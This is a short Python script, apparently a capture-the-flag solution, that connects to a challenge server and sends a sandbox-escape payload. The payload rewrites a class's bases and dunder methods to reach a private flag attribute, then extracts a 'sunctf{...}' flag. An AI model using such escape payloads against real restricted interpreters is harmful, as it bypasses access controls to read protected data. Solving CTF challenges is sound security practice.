from socket import *
import re


with socket(AF_INET, SOCK_STREAM) as s:
    s.connect(('174.138.24.68', 28051))

    s.recv(1024)

    payload = 'PublicLocker.__bases__ = (SunLocker, )\n' \
              'PublicLocker.__add__ = print\n' \
              'PublicLocker.__invert__ = locker._SunLocker__flag\n' \
              'locker + ~locker\nend\n'
    s.sendall(payload.encode())

    ret = s.recv(1024)
    flag = re.search(r'sunctf{.*?}', ret.decode())
    print(flag.group())
